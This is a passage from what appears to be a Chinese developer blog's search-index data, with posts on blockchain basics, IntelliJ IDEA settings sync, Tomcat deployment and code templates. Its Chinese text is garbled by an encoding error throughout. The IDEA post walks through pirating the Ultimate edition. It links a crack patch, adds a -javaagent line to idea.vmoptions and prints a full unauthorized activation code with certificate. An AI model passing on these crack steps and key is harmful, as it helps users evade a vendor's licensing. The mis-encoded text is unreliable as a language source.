åˆ°è‡ªå·±ç»´æŠ¤çš„åŒºå—é“¾ç»“æ„ä¸Šæ—¶ï¼Œè¯¥åŒºå—è¢«ç½‘ç»œæ¥å—ï¼ŒåŒºå—ä¸­æ‰€åŒ…æ‹¬çš„äº¤æ˜“ä¹Ÿå°±å¾—åˆ°ç¡®è®¤ã€‚ å½“ç„¶ï¼Œåœ¨å®ç°ä¸Šè¿˜ä¼šæœ‰å¾ˆå¤šé¢å¤–çš„ç»†èŠ‚ã€‚è¿™é‡Œé¢æ¯”è¾ƒå…³é”®çš„æ­¥éª¤æœ‰ä¸¤ä¸ªï¼šä¸€ä¸ªæ˜¯å®Œæˆå¯¹ä¸€æ‰¹äº¤æ˜“çš„å…±è¯† (åˆ›å»ºåŒºå—ç»“æ„)ï¼›ä¸€ä¸ªæ˜¯æ–°çš„åŒºå—æ·»åŠ åˆ°åŒºå—é“¾ç»“æ„ä¸Šï¼Œè¢«å¤§å®¶è®¤å¯ï¼Œç¡®ä¿æœªæ¥æ— æ³•è¢«ç¯¡æ”¹ã€‚æ¯”ç‰¹å¸çš„è¿™ç§åŸºäºç®—åŠ›å¯»æ‰¾ nonce ä¸²çš„å…±è¯†æœºåˆ¶ç§°ä¸ºå·¥ä½œé‡è¯æ˜ ( Proof of Work ï¼ŒPoW )ã€‚ç›®å‰ï¼Œè¦è®©å“ˆå¸Œç»“æœæ»¡è¶³ä¸€å®šæ¡ä»¶ï¼Œå¹¶æ— å·²çŸ¥çš„å¿«é€Ÿå¯å‘å¼ç®—æ³•ï¼Œåªèƒ½è¿›è¡Œå°è¯•æ€§çš„æš´åŠ›è®¡ç®—ã€‚å°è¯•çš„æ¬¡æ•°è¶Šå¤š (å·¥ä½œé‡è¶Šå¤§)ï¼Œç®—å‡ºæ¥çš„æ¦‚ç‡è¶Šå¤§ã€‚é€šè¿‡è°ƒèŠ‚å¯¹å“ˆå¸Œç»“æœçš„é™åˆ¶ï¼Œæ¯”ç‰¹å¸ç½‘ç»œæ§åˆ¶å¹³å‡çº¦ 10 åˆ†é’Ÿäº§ç”Ÿä¸€ä¸ªåˆæ³•åŒºå—ã€‚ç®—å‡ºåŒºå—çš„èŠ‚ç‚¹å°†å¾—åˆ°åŒºå—ä¸­æ‰€æœ‰äº¤æ˜“çš„ç®¡ç†è´¹å’Œåè®®å›ºå®šå‘æ”¾çš„å¥–åŠ±è´¹ (ç›®å‰æ˜¯ 12.5 æ¯”ç‰¹å¸ï¼Œæ¯å››å¹´å‡åŠ)ï¼Œè¿™ä¸ªè®¡ç®—æ–°åŒºå—çš„è¿‡ç¨‹ä¿—ç§°ä¸ºæŒ–çŸ¿ã€‚ åŸºäºåŒºå—é“¾çš„åˆ†å¸ƒå¼è´¦æœ¬çš„ç‰¹ç‚¹ ç»´æŠ¤ä¸€æ¡ä¸æ–­å¢é•¿çš„é“¾ï¼Œåªå¯èƒ½æ·»åŠ è®°å½•ï¼Œè€Œå‘ç”Ÿè¿‡çš„è®°å½•éƒ½ä¸å¯ç¯¡æ”¹ï¼› å»ä¸­å¿ƒåŒ–ï¼Œæˆ–è€…è¯´å¤šä¸­å¿ƒåŒ–ï¼Œæ— éœ€é›†ä¸­æ§åˆ¶è€Œèƒ½è¾¾æˆå…±è¯†ï¼Œå®ç°ä¸Šå°½é‡é‡‡ç”¨åˆ†å¸ƒå¼ï¼› é€šè¿‡å¯†ç å­¦çš„æœºåˆ¶æ¥ç¡®ä¿äº¤æ˜“æ— æ³•è¢«æŠµèµ–å’Œç ´åï¼Œå¹¶å°½é‡ä¿æŠ¤ç”¨æˆ·ä¿¡æ¯å’Œè®°å½•çš„éšç§æ€§ ã€‚ åŒºå—é“¾æŠ€æœ¯çš„ä¸‰ç§å…¸å‹æ¼”åŒ–åœºæ™¯ åœºæ™¯ åŠŸèƒ½ æ™ºèƒ½åˆçº¦ ä¸€è‡´æ€§ æƒé™ ç±»å‹ æ€§èƒ½ ç¼–ç¨‹è¯­è¨€ ä»£è¡¨ å…¬ä¿¡çš„æ•°å­—è´§å¸ è®°è´¦åŠŸèƒ½ ä¸å¸¦æœ‰æˆ–è¾ƒå¼± PoW æ—  å…¬æœ‰é“¾ è¾ƒä½ ç®€å•è„šæœ¬ æ¯”ç‰¹å¸ç½‘ç»œ å…¬ä¿¡çš„äº¤æ˜“å¤„ç† æ™ºèƒ½åˆçº¦ å›¾çµå®Œå¤‡ PoWã€PoS æ—  å…¬æœ‰é“¾ å—é™ ç‰¹å®šè¯­è¨€ ä»¥å¤ªåŠç½‘ç»œ å¸¦æƒé™çš„åˆ†å¸ƒå¼è´¦æœ¬å¤„ç† å•†ä¸šå¤„ç† å¤šç§è¯­è¨€ï¼Œå›¾çµå®Œå¤‡ åŒ…æ‹¬ CFTã€ BFT åœ¨å†…çš„å¤šç§æœºåˆ¶ï¼Œå¯æ’æ‹” æ”¯æŒ è”ç›Ÿé“¾ å¯æ‰©å±• é«˜çº§ç¼–ç¨‹è¯­è¨€ è¶…çº§è´¦æœ¬ åŒºå—é“¾çš„åˆ†ç±»æ ¹æ®å‚ä¸è€…çš„ä¸åŒï¼Œå¯ä»¥åˆ†ä¸ºå…¬å¼€ (public) é“¾ã€ç§æœ‰ ( private ) é“¾å’Œè”ç›Ÿ ( consortium ) é“¾ã€‚ å…¬æœ‰é“¾ï¼Œé¡¾åæ€ä¹‰ï¼Œä»»ä½•äººéƒ½å¯ä»¥å‚ä¸ä½¿ç”¨å’Œç»´æŠ¤ï¼Œå¦‚æ¯”ç‰¹å¸åŒºå—é“¾ï¼Œä¿¡æ¯æ˜¯å®Œå…¨å…¬å¼€çš„ï¼›å¦‚æœè¿›ä¸€æ­¥å¼•äººè®¸å¯æœºåˆ¶ï¼Œå¯ä»¥å®ç°ç§æœ‰é“¾å’Œè”ç›Ÿé“¾ä¸¤ç§ç±»å‹ï¼› ç§æœ‰é“¾ï¼Œç”±é›†ä¸­ç®¡ç†è€…è¿›è¡Œç®¡ç†é™åˆ¶ï¼Œåªæœ‰å†…éƒ¨å°‘æ•°äººå¯ä»¥ä½¿ç”¨ï¼Œä¿¡æ¯ä¸å…¬å¼€ï¼› è”ç›Ÿé“¾ï¼Œä»‹äºä¸¤è€…ä¹‹é—´ï¼Œç”±è‹¥å¹²ç»„ç»‡ä¸€èµ·åˆä½œç»´æŠ¤ä¸€æ¡åŒºå—é“¾ï¼Œè¯¥åŒºå—é“¾çš„ä½¿ç”¨å¿…é¡»æ˜¯å¸¦æœ‰æƒé™çš„é™åˆ¶è®¿é—®ï¼Œç›¸å…³ä¿¡æ¯ä¼šå¾—åˆ°ä¿æŠ¤ï¼Œå¦‚ä¾›åº”é“¾æœºæ„æˆ–é“¶è¡Œè”ç›Ÿã€‚ ç›®å‰æ¥çœ‹ï¼Œå…¬æœ‰é“¾æ›´å®¹æ˜“å¸å¼•å¸‚åœºå’Œåª’ä½“çš„çœ¼çƒï¼Œä½†æ›´å¤šçš„å•†ä¸šä»·å€¼ä¼šåœ¨ç§æœ‰é“¾å’Œè”ç›Ÿé“¾ä¸Šè½åœ°ã€‚æ ¹æ®ä½¿ç”¨ç›®çš„å’Œåœºæ™¯çš„ä¸åŒï¼Œåˆå¯ä»¥åˆ†ä¸ºä»¥æ•°å­—è´§å¸ä¸ºç›®çš„çš„è´§å¸é“¾ï¼Œä»¥è®°å½•äº§æƒä¸ºç›®çš„çš„äº§æƒé“¾ï¼Œä»¥ä¼—ç­¹ä¸ºç›®çš„çš„ä¼—ç­¹é“¾ç­‰ï¼Œä¹Ÿæœ‰ä¸å±€é™ç‰¹å®šåº”ç”¨åœºæ™¯çš„é€šç”¨é“¾ã€‚ç°æœ‰å¤§éƒ¨åˆ†åŒºå—é“¾å®ç°éƒ½è‡³å°‘åŒ…æ‹¬äº†ç½‘ç»œå±‚ã€å…±è¯†å±‚ã€æ™ºèƒ½åˆçº¦å’Œåº”ç”¨å±‚ç­‰ç»“æ„ï¼Œè”ç›Ÿé“¾å®ç°å¾€å¾€è¿˜ä¼šå¼•äººä¸€å®šçš„æƒé™ç®¡ç†æœºåˆ¶ã€‚ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"åŠ å¯†è´§å¸"},{title:"IDEA ä¹‹äº”æ——èˆ°ç‰ˆæ¿€æ´»ä¸åŒæ­¥é…ç½®",url:"/posts/69ad1320.html",text:'IntelliJ IDEA çš„ä¸‰ç§æ¿€æ´»æ–¹å¼ æ³¨å†Œç æ¿€æ´» ç ´è§£è¡¥ä¸æ¿€æ´» License Server åœ¨çº¿æ¿€æ´» IntelliJ IDEA ä½¿ç”¨ç ´è§£è¡¥ä¸æ¿€æ´»ï¼ˆ2019.1 ç‰ˆäº²æµ‹æ¿€æ´»æˆåŠŸï¼‰ 1.IDEA å®‰è£…å®Œæˆåï¼Œå…³é—­ IDEA 2. ç ´è§£è¡¥ä¸ä¸‹è½½ï¼šç™¾åº¦ç½‘ç›˜ æå–ç ï¼škb1f 3. å°†ç ´è§£è¡¥ä¸æ–‡ä»¶ JetbrainsIdesCrack.jar å¤åˆ¶åˆ° IDEA çš„ bin ç›®å½•ä¸‹ 4. æ›´æ”¹ IDEA çš„ bin ç›®å½•ä¸­çš„ idea.vmoptionsï¼ˆ32ä½ç³»ç»Ÿï¼‰ã€idea64.vmoptionsï¼ˆ64ä½ç³»ç»Ÿï¼‰æ–‡ä»¶ï¼Œåœ¨é…ç½®æ–‡ä»¶æœ«å°¾æ·»åŠ ä¸€è¡Œå†…å®¹ï¼ŒæŒ‡å®šç ´è§£è¡¥ä¸æ–‡ä»¶çš„ä½ç½®ï¼ˆæ³¨æ„ï¼šè¿™é‡Œéœ€è¦ä¿®æ”¹ä¸ºä½ è‡ªå·±çš„æ–‡ä»¶è·¯å¾„ï¼‰ 1-javaagent:/usr/local/ideaIU-2019.1.3/bin/JetbrainsIdesCrack.jar 5. å¯åŠ¨ IDEAï¼Œè¾“å…¥ä»¥ä¸‹æ¿€æ´»ç è¿›è¡Œæ¿€æ´» 1Y9MXSIF79G-eyJsaWNlbnNlSWQiOiJZOU1YU0lGNzlHIiwibGljZW5zZWVOYW1lIjoiSkJGYW1pbHkgQ2hpbmEiLCJhc3NpZ25lZU5hbWUiOiIiLCJhc3NpZ25lZUVtYWlsIjoiIiwibGljZW5zZVJlc3RyaWN0aW9uIjoiIiwiY2hlY2tDb25jdXJyZW50VXNlIjpmYWxzZSwicHJvZHVjdHMiOlt7ImNvZGUiOiJJSSIsImZhbGxiYWNrRGF0ZSI6IjIwMTktMDctMjYiLCJwYWlkVXBUbyI6IjIwMjAtMDctMjUifSx7ImNvZGUiOiJBQyIsImZhbGxiYWNrRGF0ZSI6IjIwMTktMDctMjYiLCJwYWlkVXBUbyI6IjIwMjAtMDctMjUifSx7ImNvZGUiOiJEUE4iLCJmYWxsYmFja0RhdGUiOiIyMDE5LTA3LTI2IiwicGFpZFVwVG8iOiIyMDIwLTA3LTI1In0seyJjb2RlIjoiUFMiLCJmYWxsYmFja0RhdGUiOiIyMDE5LTA3LTI2IiwicGFpZFVwVG8iOiIyMDIwLTA3LTI1In0seyJjb2RlIjoiR08iLCJmYWxsYmFja0RhdGUiOiIyMDE5LTA3LTI2IiwicGFpZFVwVG8iOiIyMDIwLTA3LTI1In0seyJjb2RlIjoiRE0iLCJmYWxsYmFja0RhdGUiOiIyMDE5LTA3LTI2IiwicGFpZFVwVG8iOiIyMDIwLTA3LTI1In0seyJjb2RlIjoiQ0wiLCJmYWxsYmFja0RhdGUiOiIyMDE5LTA3LTI2IiwicGFpZFVwVG8iOiIyMDIwLTA3LTI1In0seyJjb2RlIjoiUlMwIiwiZmFsbGJhY2tEYXRlIjoiMjAxOS0wNy0yNiIsInBhaWRVcFRvIjoiMjAyMC0wNy0yNSJ9LHsiY29kZSI6IlJDIiwiZmFsbGJhY2tEYXRlIjoiMjAxOS0wNy0yNiIsInBhaWRVcFRvIjoiMjAyMC0wNy0yNSJ9LHsiY29kZSI6IlJEIiwiZmFsbGJhY2tEYXRlIjoiMjAxOS0wNy0yNiIsInBhaWRVcFRvIjoiMjAyMC0wNy0yNSJ9LHsiY29kZSI6IlBDIiwiZmFsbGJhY2tEYXRlIjoiMjAxOS0wNy0yNiIsInBhaWRVcFRvIjoiMjAyMC0wNy0yNSJ9LHsiY29kZSI6IlJNIiwiZmFsbGJhY2tEYXRlIjoiMjAxOS0wNy0yNiIsInBhaWRVcFRvIjoiMjAyMC0wNy0yNSJ9LHsiY29kZSI6IldTIiwiZmFsbGJhY2tEYXRlIjoiMjAxOS0wNy0yNiIsInBhaWRVcFRvIjoiMjAyMC0wNy0yNSJ9LHsiY29kZSI6IkRCIiwiZmFsbGJhY2tEYXRlIjoiMjAxOS0wNy0yNiIsInBhaWRVcFRvIjoiMjAyMC0wNy0yNSJ9LHsiY29kZSI6IkRDIiwiZmFsbGJhY2tEYXRlIjoiMjAxOS0wNy0yNiIsInBhaWRVcFRvIjoiMjAyMC0wNy0yNSJ9LHsiY29kZSI6IlJTVSIsImZhbGxiYWNrRGF0ZSI6IjIwMTktMDctMjYiLCJwYWlkVXBUbyI6IjIwMjAtMDctMjUifV0sImhhc2giOiIxMzgzODYyOS8wIiwiZ3JhY2VQZXJpb2REYXlzIjo3LCJhdXRvUHJvbG9uZ2F0ZWQiOmZhbHNlLCJpc0F1dG9Qcm9sb25nYXRlZCI6ZmFsc2V9-rI4et6OSKLA4gvOzxtyp48SCWtjwsOSQBJittaw6BOVJOwVBz0p31wBWDFSdIogdRPKquk2BAou7N694entEn4/Db3Ol5uotDtUd2MHuo+BBu9QcwIoX3RTrnYLwJfTlEJfRH/3TF3WtkPGQZQQcw/23hsZzdC/WJY6tmvyTijIBScUsvIOxZ+8REbWbkTQx1KliliFyrMua7hit8LThzfffZloHciaHwUP9BjxEjU0qQi+yFacSXjxEZERJT25hZrMN+bqBxcn59/4UJBrITt8YpLIlydt0+6vMSWAMawMzKpeDEDInKy0XomauTIUfxS4sbw/dSyVdSrh+IuOc7g==-MIIElTCCAn2gAwIBAgIBCTANBgkqhkiG9w0BAQsFADAYMRYwFAYDVQQDDA1KZXRQcm9maWxlIENBMB4XDTE4MTEwMTEyMjk0NloXDTIwMTEwMjEyMjk0NlowaDELMAkGA1UEBhMCQ1oxDjAMBgNVBAgMBU51c2xlMQ8wDQYDVQQHDAZQcmFndWUxGTAXBgNVBAoMEEpldEJyYWlucyBzLnIuby4xHTAbBgNVBAMMFHByb2QzeS1mcm9tLTIwMTgxMTAxMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAxcQkq+zdxlR2mmRYBPzGbUNdMN6OaXiXzxIWtMEkrJMO/5oUfQJbLLuMSMK0QHFmaI37WShyxZcfRCidwXjot4zmNBKnlyHodDij/78TmVqFl8nOeD5+07B8VEaIu7c3E1N+e1doC6wht4I4+IEmtsPAdoaj5WCQVQbrI8KeT8M9VcBIWX7fD0fhexfg3ZRt0xqwMcXGNp3DdJHiO0rCdU+Itv7EmtnSVq9jBG1usMSFvMowR25mju2JcPFp1+I4ZI+FqgR8gyG8oiNDyNEoAbsR3lOpI7grUYSvkB/xVy/VoklPCK2h0f0GJxFjnye8NT1PAywoyl7RmiAVRE/EKwIDAQABo4GZMIGWMAkGA1UdEwQCMAAwHQYDVR0OBBYEFGEpG9oZGcfLMGNBkY7SgHiMGgTcMEgGA1UdIwRBMD+AFKOetkhnQhI2Qb1t4Lm0oFKLl/GzoRykGjAYMRYwFAYDVQQDDA1KZXRQcm9maWxlIENBggkA0myxg7KDeeEwEwYDVR0lBAwwCgYIKwYBBQUHAwEwCwYDVR0PBAQDAgWgMA0GCSqGSIb3DQEBCwUAA4ICAQAF8uc+YJOHHwOFcPzmbjcxNDuGoOUIP+2h1R75Lecswb7ru2LWWSUMtXVKQzChLNPn/72W0k+oI056tgiwuG7M49LXp4zQVlQnFmWU1wwGvVhq5R63Rpjx1zjGUhcXgayu7+9zMUW596Lbomsg8qVve6euqsrFicYkIIuUu4zYPndJwfe0YkS5nY72SHnNdbPhEnN8wcB2Kz+OIG0lih3yz5EqFhld03bGp222ZQCIghCTVL6QBNadGsiN/lWLl4JdR3lJkZzlpFdiHijoVRdWeSWqM4y0t23c92HXKrgppoSV18XMxrWVdoSM3nuMHwxGhFyde05OdDtLpCv+jlWf5REAHHA201pAU6bJSZINyHDUTB+Beo28rRXSwSh3OUIvYwKNVeoBY+KwOJ7WnuTCUq1meE6GkKc4D/cXmgpOyW/1SmBz3XjVIi/zprZ0zf3qH5mkphtg6ksjKgKjmx1cXfZAAX6wcDBNaCL+Ortep1Dh8xDUbqbBVNBL4jbiL3i3xsfNiyJgaZ5sX7i8tmStEpLbPwvHcByuf59qJhV/bZOl8KqJBETCDJcY6O2aqhTUy+9x93ThKs1GKrRPePrWPluud7ttlgtRveit/pcBrnQcXOl1rHq7ByB8CFAxNotRUYL9IF5n3wJOgkPojMy6jetQA5Ogc8Sm7RG6vg1yow== 6.IDEA å¯åŠ¨å®Œæˆåï¼Œèœå•æ å¯¼èˆªåˆ° Help -&gt; About æŸ¥çœ‹æˆåŠŸæ¿€æ´»åçš„ç‰ˆæœ¬ä¿¡æ¯ IntelliJ IDEA åŒæ­¥é…ç½® IntelliJ IDEA æ”¯æŒå®‰è£…åœ¨ä¸åŒè®¡ç®—æœºä¸Šçš„ IntelliJ IDEAï¼ˆæˆ–å…¶ä»–åŸºäº IntelliJ å¹³å°çš„ï¼‰äº§å“çš„ä¸åŒå®ä¾‹ä¹‹é—´å…±äº« IDE è®¾ç½®ã€‚å¦‚æœå®‰è£…äº†å¤šä¸ª IntelliJ IDEAï¼Œæˆ–è€…å¸Œæœ›åœ¨å›¢é˜Ÿæˆå‘˜æˆ–å…¬å¸èŒƒå›´å†…å®æ–½ç›¸åŒçš„è®¾ç½®ï¼Œè¿™å°†éå¸¸æœ‰ç”¨ã€‚IntelliJ IDEA ä¸ºæ­¤æä¾›äº† Settings Repository ä¸ IDE Settings Sync æ’ä»¶ï¼Œè¿™ä¸¤æ¬¾æ’ä»¶é»˜è®¤æƒ…å†µä¸‹å¤„äºæ¿€æ´»çŠ¶æ€ï¼Œå¦‚æœæ’ä»¶æ²¡æœ‰æ¿€æ´»ï¼Œå¯ä»¥åœ¨æ’ä»¶é…ç½®ä¸­æ‰¾åˆ°å®ƒä»¬ï¼Œå¹¶è®¾ç½®ä¸ºå¯ç”¨çŠ¶æ€ã€‚å€¼å¾—ä¸€æçš„æ˜¯ï¼Œç›®å‰çš„åŒæ­¥æ’ä»¶ä¸æ”¯æŒåŒæ­¥å·²å®‰è£…æ’ä»¶çš„ä¿¡æ¯ã€‚å…±äº« IDE è®¾ç½®çš„å…·ä½“æ­¥éª¤å¦‚ä¸‹ï¼š åœ¨ä»»ä½• Git æ‰˜ç®¡æœåŠ¡ä¸Šåˆ›å»ºä»“åº“ç”¨äºå­˜å‚¨ IntelliJ IDEA çš„é…ç½®æ–‡ä»¶ï¼Œä¾‹å¦‚ GitHub æˆ– Gitlabã€‚ å¦‚æœä½¿ç”¨ Github ä½œä¸º æ‰˜ç®¡æœåŠ¡ï¼Œéœ€è¦åˆ›å»º Personal Access Tokenï¼Œåˆ›å»ºæ•™ç¨‹ç‚¹è¿™é‡Œï¼Œåˆ›å»º Access Token æ—¶èµ‹äºˆ repo çš„æ‰€æœ‰æƒé™å³å¯ã€‚ åœ¨è¦å…±äº«å…¶é…ç½®æ–‡ä»¶çš„ IntelliJ IDEA å®ä¾‹é‡Œï¼Œå¯¼èˆªåˆ° File â€“&gt; Settings Repositoryï¼ŒæŒ‡å®šä¸Šé¢åˆ›å»ºçš„è¿œç¨‹ä»“åº“çš„ URLï¼Œæ ¹æ®æç¤ºä¿¡æ¯å¡«å†™ Access Tokenï¼Œç„¶åç‚¹å‡» â€œOverwrite Remoteâ€ï¼Œå°†é…ç½®æ–‡ä»¶ Push åˆ°è¿œç¨‹ä»“åº“ã€‚ åœ¨è¦ä½¿ç”¨è¿œç¨‹é…ç½®æ–‡ä»¶çš„å…¶ä»– IntelliJ IDEA å®ä¾‹é‡Œï¼Œå¯¼èˆªåˆ° File â€“&gt; Settings Repositoryï¼ŒæŒ‡å®šä¸Šé¢åˆ›å»ºçš„è¿œç¨‹ä»“åº“çš„ URLï¼Œæ ¹æ®æç¤ºä¿¡æ¯å¡«å†™ Access Tokenï¼Œç„¶åç‚¹å‡» â€œOverwrite Localâ€ï¼Œå°†é…ç½®æ–‡ä»¶ Pull åˆ°æœ¬åœ°ã€‚å¦‚æœæƒ³åŒæ—¶ä¿ç•™è¿œç¨‹è®¾ç½®å’Œæœ¬åœ°è®¾ç½®ï¼Œå¯ä»¥ç‚¹å‡» â€œMergeâ€ï¼Œä¸€æ—¦æ£€æµ‹åˆ°ä»»ä½•å†²çªï¼Œå¯ä»¥åœ¨æ˜¾ç¤ºçš„å¯¹è¯æ¡†ä¸­è§£å†³å†²çªã€‚å¦‚æœæƒ³æœ¬åœ°é…ç½®è¦†ç›–è¿œç¨‹é…ç½®ï¼Œå¯ä»¥ç‚¹å‡» â€œOverwrite Remoteâ€ã€‚ å¦‚æœè¦ç¦ç”¨è‡ªåŠ¨åŒæ­¥é…ç½®ï¼Œå¯¼èˆªåˆ°ï¼šIDEA é…ç½®ä¸­å¿ƒ â€“&gt; Tools â€“&gt; Settings Repositoryï¼Œå–æ¶ˆå‹¾é€‰ Auto Sync é€‰é¡¹ã€‚å½“éœ€è¦åŒæ­¥è¿œç¨‹çš„é…ç½®æ—¶ï¼Œå¯ä»¥å¯¼èˆªåˆ°ï¼šä¸»èœå• â€“&gt; VCS â€“&gt; Sync Settings æ¥æ‰‹åŠ¨åŒæ­¥ã€‚ IntelliJ IDEA åŒæ­¥é…ç½®ä¹‹å…±äº« IDE è®¤è¯ IntelliJ IDEA åœ¨ç¬¬ä¸€æ¬¡åŒæ­¥æ—¶ï¼Œå°†ä¼šæç¤ºè¾“å…¥è®¿é—®è¿œç¨‹ä»“åº“çš„ç”¨æˆ·åå’Œå¯†ç ï¼Œå»ºè®®ä½¿ç”¨ Access Token è¿›è¡Œ GitHub èº«ä»½éªŒè¯ã€‚å¦‚æœç”±äºæŸç§åŸå› ï¼Œæƒ³è¦ä½¿ç”¨ç”¨æˆ·åå’Œå¯†ç è€Œä¸æ˜¯ Access Tokenï¼Œæˆ–è€…ä½¿ç”¨çš„ Git æ‰˜ç®¡æœåŠ¡æä¾›å•†ä¸æ”¯æŒå®ƒï¼Œå»ºè®®é…ç½® Git å‡­è¯åŠ©æ‰‹ã€‚è¯·æ³¨æ„ MacOS Keychain æ˜¯å—æ”¯æŒçš„ï¼Œè¿™æ„å‘³ç€å¯ä»¥åœ¨æ‰€æœ‰åŸºäº IntelliJ å¹³å°çš„äº§å“ä¹‹é—´å…±äº«å‡­æ®ï¼ˆå¦‚æœåŸå§‹ IDE ä¸è¯·æ±‚æ–¹ IDE ä¸åŒï¼Œç³»ç»Ÿå°†æç¤ºæˆäºˆè®¿é—®æƒé™ï¼‰ã€‚ IntelliJ IDEA åŒæ­¥é…ç½®ä¹‹ä¸é…ç½®åªè¯»æº é™¤äº† Settings Repositoryï¼Œè¿˜å¯ä»¥é…ç½®ä»»ä½•æ•°é‡çš„å…¶ä»–å­˜å‚¨åº“ï¼Œå…¶ä¸­å°±åŒ…å«éœ€è¦å…±äº«çš„ä»»ä½•ç±»å‹çš„è®¾ç½®ï¼ŒåŒ…æ‹¬å®æ—¶æ¨¡æ¿ã€æ–‡ä»¶æ¨¡æ¿ã€æ–¹æ¡ˆã€éƒ¨ç½²é€‰é¡¹ç­‰ã€‚è¿™äº›å­˜å‚¨åº“è¢«ç§°ä¸ºåªè¯»æºï¼Œå› ä¸ºå®ƒä»¬ä¸èƒ½è¢«è¦†ç›–æˆ–åˆå¹¶ï¼Œä»…ç”¨ä½œè®¾ç½®æºã€‚è¦é…ç½®æ­¤ç±»å­˜å‚¨åº“ï¼Œå¯¼èˆªåˆ°ï¼šIDEA é…ç½®ä¸­å¿ƒ â€“&gt; Tools â€“&gt; Settings Repositoryï¼Œå•å‡» â€œ+â€ å¹¶æ·»åŠ è¦å­˜å‚¨å…±äº«è®¾ç½®çš„ GitHub ä»“åº“çš„ URL å³å¯ã€‚åªè¯»æºä¸­çš„é…ç½®è¿›è¡ŒåŒæ­¥çš„æ–¹æ³•ä¸ Settings Repository åŒæ­¥çš„æ–¹æ³•ç›¸åŒã€‚ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"å¼€å‘å·¥å…·"},{title:"IntelliJ IDEA ä¹‹å››å¸¸ç”¨é…ç½®ä¸ä½¿ç”¨",url:"/posts/6960eed1.html",text:'IntelliJ IDEA åˆ›å»ºé™æ€ Web æ¨¡å— IntelliJ IDEA åˆ›å»ºåŠ¨æ€ Java Web æ¨¡å— IntelliJ IDEA éƒ¨ç½²åŠ¨æ€ Java Web æ¨¡å—åˆ°æœ¬åœ° Tomcat åœ¨ IDEA ä¸­é…ç½® Tomcat ä¹‹å‰ï¼Œéœ€è¦ä¿è¯æœ¬åœ°å·²ç»ä¸‹è½½äº† Tomcatã€‚ æ·»åŠ æœ¬åœ° Tomcat æœåŠ¡å™¨ é…ç½® Tomcat çš„åç§°å’Œæœ¬åœ°ä½ç½® è®¾ç½®è¦å¯åŠ¨çš„æµè§ˆå™¨ã€é¡¹ç›®è®¿é—®åœ°å€ä»¥åŠ Tomcat ç›‘å¬çš„ç«¯å£å· éƒ¨ç½²åŠ¨æ€ Java Web æ¨¡å—åˆ° Tomcat å¯åŠ¨ Tomcat Tomcat å¯åŠ¨åè¾“å‡ºçš„æ—¥å¿—ä¿¡æ¯ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"å¼€å‘å·¥å…·"},{title:"IntelliJ IDEA ä¹‹ä¸‰å¸¸ç”¨é…ç½®ä¸ä½¿ç”¨",url:"/posts/cc0ea4f8.html",text:'IntelliJ IDEA è®¾ç½®ä»£ç è¡¥å…¨æ¨¡ç‰ˆ IntelliJ IDEA è®¾ç½®ä»£ç æ¨¡ç‰ˆ å®˜æ–¹å¸¸ç”¨ Java ä»£ç æ¨¡ç‰ˆçš„ä½¿ç”¨æ–¹å¼å¦‚ä¸‹ï¼š 12345678910111213141516171819202122232425foriï¼šè¾“å‡º For å¾ªç¯çš„ä»£ç ç»“æ„itarï¼šè¾“å‡ºå®Œæ•´çš„ For å¾ªç¯ä»£ç ç»“æ„iterï¼šè¾“å‡ºå¢å¼º For å¾ªç¯çš„ä»£ç ç»“æ„ifnï¼šè¾“å‡ºåˆ¤æ–­ä¸Šä¸€ä¸ªå˜é‡æ˜¯å¦ä¸ºç©ºçš„ä»£ç innï¼šè¾“å‡ºåˆ¤æ–­ä¸Šä¸€ä¸ªå˜é‡æ˜¯å¦ä¸ä¸ºç©ºçš„ä»£ç xx.nnï¼šè¾“å‡ºåˆ¤æ–­æŒ‡å®šå˜é‡æ˜¯å¦ä¸ä¸ºç©ºçš„ä»£ç xx.nullï¼šè¾“å‡ºåˆ¤æ–­æŒ‡å®šå˜é‡æ˜¯å¦ä¸ºç©ºçš„ä»£ç psvmï¼šè¾“å‡º Main æ–¹æ³•psfï¼šè¾“å‡º public static finalprsfï¼šè¾“å‡º private static finalpsfiï¼šè¾“å‡º public static final intpsfsï¼šè¾“å‡º public static final Stringlist.foriï¼šè¾“å‡ºéå†é›†åˆå˜é‡çš„ For å¾ªç¯ä»£ç ç»“æ„list.forï¼šè¾“å‡ºéå†é›†åˆå˜é‡çš„å¢å¼º For å¾ªç¯ä»£ç ç»“æ„list.forrï¼šè¾“å‡ºå€’åºéå†é›†åˆå˜é‡çš„ For å¾ªç¯ä»£ç ç»“æ„soufï¼šè¾“å‡º System.out.printf()soutï¼šè¾“å‡º 